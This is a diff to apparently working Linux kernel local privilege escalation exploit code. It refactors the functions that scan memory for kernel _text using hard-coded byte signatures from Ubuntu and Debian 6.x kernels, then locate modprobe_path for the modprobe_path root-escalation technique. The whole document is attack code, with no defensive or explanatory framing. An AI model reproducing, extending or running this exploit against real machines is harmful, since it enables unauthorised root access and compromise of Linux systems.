@@ -13,7 +13,7 @@
  *
  * Requirements:
  *  1) Enable CONFIG_CRYPTO_USER_API to exploit the modprobe_path LPE technique
- *  2) Ensure that KERNEL_PATTERNS_STR contains the first bytes of _text of your kernel
+ *  2) Ensure that KERNEL_TEXT_PATTERNS contains the first bytes of _text of your kernel
  */
 
 #define _GNU_SOURCE
@@ -267,30 +267,28 @@ int get_modprobe_path(char *buf, size_t buf_size)
 }
 
 /*
-* First 16 bytes of kernel_text segment
-* True for:
-* 1. Dozens of v6.x.x defconfig kernels
-* 2. Ubuntu 6.12.28; 6.6.89; 6.10.11
-* 3. Debian 6.12.25; 6.11.6; 6.1.10
-* We search for kernel_text first because
-* it is always aligned by CONFIG_PHYSICAL_ALIGN
-*/
-#define KERNEL_PATTERNS_STR                                                   \
+ * The first 16 bytes of kernel _text. Collected on:
+ *  1. Dozens of v6.x.x defconfig kernels,
+ *  2. Ubuntu 6.12.28, 6.10.11, 6.6.89,
+ *  3. Debian 6.12.25, 6.11.6, 6.1.10.
+ */
+#define KERNEL_TEXT_PATTERNS                                                  \
 	{ "\x49\x89\xf7\x48\x8d\x25\x4e\x3f\xa0\x01\xb9\x01\x01\x00\xc0\x48", \
 	  "\x49\x89\xf7\x48\x8d\x25\x4e\x3f\xa0\x01\x48\x8d\x3d\xef\xff\xff", \
 	  "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90", \
 	  "\xfc\x0f\x01\x15\xa0\xdc\x77\x03\xb8\x10\x00\x00\x00\x8e\xd8\x8e", \
 	  "\x48\x8d\x25\x51\x3f\xa0\x01\x48\x8d\x3d\xf2\xff\xff\xff\xb9\x01" }
 
-#define KERNEL_PATTERN_COUNT 5
-#define KERNEL_PATTERN_LEN 16
+#define KERNEL_TEXT_PATTERN_LEN 16
 
-int is_kernel_base(const void *addr)
+int is_kernel_text(void *addr)
 {
-	static const char *patterns[] = KERNEL_PATTERNS_STR;
+	char *patterns[] = KERNEL_TEXT_PATTERNS;
+	size_t n = sizeof(patterns) / sizeof(char *);
+	size_t i = 0;
 
-	for (size_t i = 0; i < KERNEL_PATTERN_COUNT; i++) {
-		if (memcmp(addr, patterns[i], KERNEL_PATTERN_LEN) == 0)
+	for (i = 0; i < n; i++) {
+		if (memcmp(addr, patterns[i], KERNEL_TEXT_PATTERN_LEN) == 0)
 			return 1;
 	}
 	return 0;
@@ -310,10 +308,13 @@ void *memmem_modprobe_path_bruteforce(void *memory, size_t memory_size)
 	size_t modprobe_path_len = 0;
 	char *modprobe_path_uaddr = NULL;
 
+	/*
+	 * We search for kernel _text first.
+	 * It is always aligned by CONFIG_PHYSICAL_ALIGN.
+	 */
 	printf("[!] searching kernel _text in %p-%p\n", start, end);
-
 	while (offset < memory_size) {
-		if (is_kernel_base(start + offset)) {
+		if (is_kernel_text(start + offset)) {
 			kernel_text = start + offset;
 			break;
 		}
